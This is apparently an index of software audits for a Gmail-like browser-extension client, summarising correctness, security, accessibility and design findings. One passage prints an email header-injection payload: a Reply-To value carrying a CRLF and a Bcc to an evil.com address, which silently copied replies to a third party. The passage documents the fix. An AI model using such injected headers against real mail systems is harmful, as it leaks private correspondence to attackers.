# Audits

Nine audits of the v2 codebase. The first six were written after the build was
feature-complete and before it had ever run in a browser; 07 and 08 are
competitive gap analyses against Gmail, and 06 carries the record of thirteen
autonomous defect-hunting cycles.

Every finding was verified by executing the code, not by reading it — where a
claim was testable, the proof is quoted. Findings that turned out to be wrong
are retracted in place rather than deleted.

| # | Audit | Findings | Worst |
|---|---|---|---|
| [01](01-CORRECTNESS.md) | Correctness | 3 | List silently caps at 400 rows; nothing is persisted |
| [02](02-SECURITY.md) | Security | 3 | Sanitiser bypass behind a sound sandbox; asymmetric postMessage checks |
| [03](03-PERFORMANCE.md) | Performance | 3 | No rendering benchmark exists — the untested half |
| [04](04-ACCESSIBILITY.md) | Accessibility | 4 | Invalid listbox tree: the message list announces nothing |
| [05](05-ARCHITECTURE.md) | Architecture | 5 | Dead `GMAIL` proxy widens the app's capability |
| [06](06-TESTING.md) | Testing + 13 defect-hunt cycles | 5 + 11 | Sign-out undone by an in-flight token renewal (security); sign-out left every other mailbox populated |
| [07](07-GMAIL-COMPETITIVE.md) | Gmail competitive gap (v0.9) | 40+ | Remote and inline images are both silently broken; no Sent/Drafts/Trash; no threading |
| [08](08-GMAIL-COMPETITIVE-V2.md) | Gmail competitive gap (v1.0) | 35+ | Four settings declared and never read; two verbs still unreachable; threading is the last true gap. **§10 third pass:** shift-range could not shrink; one-row updates re-walked 2000 rows (549ms → 8.1ms) |
| [09](09-ARCHITECTURE-POST-CHANGE.md) | Post-change architecture | 4 | `ctx.store` frozen to the inbox; one domain concept with four implementations; `app.js` at 27% of the codebase |
| [10](10-DELIGHT.md) | Product delight | 10 | Archiving — the most frequent action — had no motion; the rail count was honest but not glanceable; nothing marked a cleared inbox |
| [11](11-DESIGN-SYSTEM.md) | UI/UX, motion, design system | 8 + 5 false | Toasts raised from the timetable panel rendered UNDER it and were never seen; the focus ring reshaped what it focused; six entrances used the exit curve; disabled buttons looked clickable |
| [12](12-MAIL-LIFECYCLE.md) | Core mail lifecycle | 3 core + 3 important, 2 false | Mail never arrived on its own (fixed); no outbound attachments (fixed); no conversation threading |
| [13](13-INCOMPLETENESS.md) | Severe incompleteness | 6 | Trash had ZERO usable actions; the classifier could be taught but never corrected — both write paths existed and were called from nowhere |
| [14](14-COMPLEXITY.md) | Complexity, file size, boundaries | 4 | Only 4 of app.js's 24 bindings span 3+ domains — it is a control tower with extractable tenants, not a god object. features.js was five unrelated modules sharing a filename |
| [15](15-CONSISTENCY.md) | Product consistency | 6 + 1 retracted | Star/unread undoable in bulk but not one at a time; Options settings never reached the running app |
| [16](16-FEATURE-DISCOVERY.md) | Feature discovery (no elimination) | 100 ideas | Three verbs implemented and unreachable; five features are waiting on one popover primitive and one multi-source radar |
| [17](17-FEATURE-ELIMINATION.md) | Feature elimination | 36 keep / 24 maybe / 40 cut | Every proposed new *screen* was cut; ten of eighteen academic ideas failed the identity filter; the rule engine may not ship without its dry run |
| [28](28-COMPREHENSIVE-RATING.md) | Comprehensive rating, every way 1–10 (outside audit) | 6 (F1–F6) | F1 live PAT pasted into an AI chat; F4 compose cannot send under `gmail.modify`-only scopes. Overall **8.6/10** |
| [64](64-COMPREHENSIVE-RATING-V2.md) | Comprehensive rating II, 15 ways 1–10 (outside audit, post-round-63) | 8 (F1–F8) | F1 recurred — a second live PAT, two days later; F2 the render bench CI gate can pass while red; F8 the live-browser soak is still the cap on every 9. 28's F2/F3/F4/F5 verified fixed; 0 cycles, 0 orphan modules measured. Overall **8.8/10** |

Actions are consolidated and prioritised in [`../TODO.md`](../TODO.md).

## Two notes on method

**Audit 11 reports its own false alarms.** Three of eleven findings were
wrong, plus a bug in one of its own tests and a flaw one of its own fixes
introduced. All five are written up in §"What I got wrong". A design audit that
reports only its hits is not evidence.

**Disproved suspicions are recorded, not deleted.** `03-PERFORMANCE.md`
documents two findings I raised and then measured away (`unreadCounts` per
render, prefix-search scanning). An audit that reports only confirmations is
not an audit, and the next person to have the same suspicion should be able to
see it was already checked.

**This follows a round of four retracted claims.** Four "bugs" previously
reported in the v1 classifier were all wrong, retracted in
[`../notes/CLASSIFIER_CORRECTION.md`](../notes/CLASSIFIER_CORRECTION.md). Every
finding here therefore carries the command or measurement that produced it.

## Audit 18 — per-file defect hunt (post-build)

Six bugs across the modules built for the survivor roadmap. Method was
adversarial probing rather than reading: a hostile-input harness, a ReDoS timer,
a cross-module contract checker, and doubles rebuilt from each module's *actual*
storage contract.

| # | File | Bug | Severity |
|---|---|---|---|
| 1 | `cache.js` | Dropped the `audience` stamp, so cache-first boot put list blasts in `needsReply` | **serious** |
| 2 | `backup.js` | Exported a `settings` key that never existed — captured zero preferences, silently | **serious** |
| 3 | `snippet.js` | Quadratic backtracking on dash runs, on the render path (267ms/row) | moderate |
| 4 | `followups.js` | `isAnswered` crashed on a partial store, from the radar render path | moderate |
| 5 | `followups.js` | `pruneFollowups` would delete every follow-up against an unready store | **serious** (latent) |
| 6 | `outbox.js` | `statusOf` printed "Retrying in 0s" forever after a crash-restart | low |

**The methodological finding**, which is worth more than any single fix: bugs 2
and 1 were both invisible to a full green test suite because *the test doubles
agreed with the code under test rather than with the system*. `backup.test.mjs`
seeded `{settings: {theme}}` because that is what the exporter looked for —
neither had ever consulted `settings.js`, which stores flat keys. A fake built
from the consumer's assumption can only ever confirm that assumption.

Both now have guards that walk the real schema, so the two files cannot drift
apart again.

**Cleared:** 16 XSS vectors against `sanitize.js` (entity-encoded, case-varied,
`formaction`, `<base>`, `<meta refresh>`) all blocked. Store indices consistent
across remove and recategorise. Every built-in view is a valid rule condition
and names only categories that exist.


## Audit 19 — background, MIME and classifier

Continued the per-file pass into the layers audit 18 did not reach: the service
worker, the MIME builder and parser, the classifier, and course detection.

| # | File | Bug | Severity |
|---|---|---|---|
| 7 | `gmail.js` | **Email header injection** in To/Cc/Bcc/From/In-Reply-To/References | **critical** |
| 8 | `mime.js` | Unbounded recursion — a crafted message killed the service worker | **serious** |
| 9 | `timetable-mail.js` | Course detection fired on `AI 202`, `ISBN 978` | moderate |

**Bug 7 is the most serious defect found in this project.** `safeHeaderValue`
and `safeFilename` existed and were applied to *attachment metadata only*.
Every address header was interpolated raw.

The reachable attack is not "the user types CRLF into their own message". It is
that `buildReply()` fills `To` from the **inbound** `Reply-To` header, which the
sender controls completely. A message carrying

```
Reply-To: prof@bits.ac.in\r\nBcc: harvest@evil.com
```

meant that pressing Reply — an action with no warning attached — silently
copied the reply to a third party. Verified end to end before fixing.

Two weaker fixes were tried and rejected by testing, which is why the final one
rebuilds address headers from validated tokens rather than patching the string:
deleting the break welds the payload onto the address (`a@b.comBcc: x@evil.com`),
and replacing it with a space leaves the attacker's address on the `To` line
where a lenient parser may honour it.

**Three of my own fixes were wrong and were caught before commit** — a pattern
worth recording as much as the bugs:

- A 200-char then 2000-char cap on address headers **dropped 12 recipients from
  a 60-person reply-all**. Length was never the attack.
- A 500-part breadth cap in `walk()` was unearned: measurement showed a
  million-part tree walks in 92ms, while the cap would silently drop
  attachments from a legitimate 600-part message. Removed.
- I claimed department ordering was load-bearing (BIOT before BIO). Sabotage
  proved it is not — the mandatory letter-plus-digits makes shadowing
  impossible. The source comment, the tool check and the test were all
  corrected rather than left asserting a false hazard.

**Disproved:** `classify(null)` throws, but is unreachable — `toMessage()`
normalises every field before the classifier sees it. No defensive code added.


## Audit 20 — feature discovery, second pass

100 ideas, mined from the four seams the last build cycle opened: the rule
engine as an execution surface, the activity log as a data source, the outbox
as a general job queue, and the first opportunity to cross the audience, lane
and enrolment signals against each other.

**It also found that eleven of the thirteen modules built for the audit-17
roadmap are not imported anywhere.** They are complete and covered by passing
tests; the running extension reaches none of them. See the correction appended
to `docs/BUILD-PLAN.md`. The highest-value next action is wiring, not building,
and it is not one of the 100 ideas.


## Audit 21 — visual hierarchy

Measured rather than eyeballed: CSS parsed as a rule table, the real DOM booted
in jsdom, and a `contrast × size × weight` model used to rank what the eye
actually reaches first.

Seven findings, three applied. The foundations were sound — `.primary` appears
exactly three times and never twice on one screen, the reader hierarchy is
correct (subject 27.85 / sender 17.44 / body 16.15), and academic features are
subordinate everywhere they touch the mail surface.

The two sharpest findings were both invisible by eye and only appeared once the
numbers were computed: read-row sender and subject differed by **0.3%** (a tie,
so the eye had no entry point on any row), and the sidebar's three peer headings
had **two different specifications** — the least important one rendering at 34%
more contrast than its siblings.

Also found: a pre-existing test that was time-dependent and failed for two hours
of every day.


## Audit 22 — UI completeness

Where does the interface still need one more pass? Measured: state coverage
from the parsed selector table, reachability from the import graph and the verb
list, empty states from the real DOM booted with nothing in it.

**The finding is C-1: eleven modules are built, tested and have no interface.**
A user running the current build has no outbox, no undo-send, no templates, no
rule engine, no activity log and no backup — while 1249 tests pass covering all
of them. Every other finding in the document is a refinement of something
visible; that one is eleven features that are not.

Four small completions applied: an empty state for saved views, a no-match row
in the command palette that offers a working search fallback, pressed feedback
on three surfaces that had only hover, and an accessible name in the markup for
the undo button — which was the one control in the document with no name at all.

Two findings were retracted after checking (mailbox rows and the reader header
both already complete), and one fix was wrong on the first attempt.


## Audit 23 — micro-interactions

Measured from the stylesheet parsed as a rule table, cross-referenced against
the markup and the JS that binds handlers. Seven findings, all applied.

The product was already strong here — 17 keyframes, a four-step duration scale,
`--ease-spring` used only on arrivals — so the findings are about **drift**
rather than absence: places where two surfaces doing the same job had come
apart.

The largest was `.ghost`, which changed three properties on hover with no
transition while its own link variant `a.ghost` had one. That is **45 of the 48
buttons in the product** — every toolbar and reader action — fixed by one
declaration.

Four of the seven were drift I introduced in the wiring pass: new rail sections
that matched their neighbours' layout but not their motion.


## Audit 24 — motion system

The stylesheet parsed into a table of every animation with its keyframe,
duration and easing, then every keyframe decomposed into transform and opacity
tracks. That turns "does the motion feel coherent" into a question with an
answer.

The system was already good — 24 surfaces on 4 tokenised durations, a distance
language that scales with the weight of the thing moving (3px attached, 16px
entering from off-screen), reduced-motion handled including the delays that
most implementations forget.

**The finding was asymmetry: 23 entrances and one exit.** Every overlay closed
by setting `hidden = true` — an instant vanish after a 200ms arrival — so the
eye tracked the arrival and got nothing to track on the way out.

Fixed with four exit keyframes and one shared helper, but only after two wrong
attempts that the test suite caught: deferring a menu's removal made a closed
menu still findable in the DOM, and deferring `hidden` made a closed overlay
report itself as open. Both times the tests were encoding a real contract.


## Audit 25 — design language consistency

Every value-bearing CSS property extracted as a frequency table and compared
against the token that already exists for it. A finding required a hardcoded
value *and* a peer using a token for the same job.

The language turned out to be coherent — `font-size` 120/120 tokenised,
`line-height` 13/13, radius and spacing complete, one button system, one menu
primitive. What it had was **four unfinished migrations**: `letter-spacing`
(9/16), shadows (12/22), hand-written icon strokes spanning 1.00–1.60px
effective, and `.tt-panel`, the only overlay of eight that opted out of the
theme system and therefore cast a dark shadow on the four light themes.

Both findings with real user-visible consequences were on academic surfaces —
the identity rule failing in the direction it warns about.

A guard written for one finding immediately caught a fifth instance
(`.snooze-menu` hand-forking its dark theme) that I had missed by looking at
shadows and theme overrides separately rather than at their intersection.


## Audit 26 — premium feel

Craftsmanship rather than polish. After twenty-five audits the type scale,
spacing rhythm, motion system and token compliance were already fixed, so this
pass looked where none of the others had: at **what happens when real content
meets the layout**.

The finding was that **seven `text-overflow: ellipsis` declarations could never
fire** — flex children with no `min-width: 0`, which means they grow past their
container instead of truncating. The symptom is a deadline title shoving the
date off the edge of the rail: the layout losing control of its own content,
which is the loudest "unfinished" signal a UI can emit. Five components had the
pattern right and seven did not.

Also: three sender-controlled strings in the reader (`Subject:`, `From:`, a
filename) had no overflow defence at all; `user-select` appeared zero times, so
dragging across the message list smeared selection highlight over the UI; and
filenames truncated at the end, hiding the extension — the one part that says
whether it is the file you wanted.

The reading surface, by contrast, was already excellent: 15px/1.65 at a 68ch
measure with a written rationale, constrained images, `pre-wrap`, capped tables.


## Audit 27 — empty, loading and error states

Every state where the product is not on the happy path, reached by tracing the
code path a user actually arrives through rather than by reading markup.

**This turned out to be the strongest area of the product.** The empty state
alone has six contextual branches, each with its own copy and its own recovery
action — including one that refuses to say "you're all caught up" when the list
is empty only because a mute rule hid everything, on the grounds that a feature
which can make mail vanish without trace is how you lose someone's trust.
Search states, quota handling, auth expiry and draft recovery are all complete.

The gap was **offline**: `navigator.onLine` appeared nowhere, so a dropped
connection surfaced as `toast("Failed to fetch")` — browser jargon, styled as
information rather than a problem, gone in 2200ms. Offline is not an event, it
is a condition, and the codebase already had the right idiom for conditions.
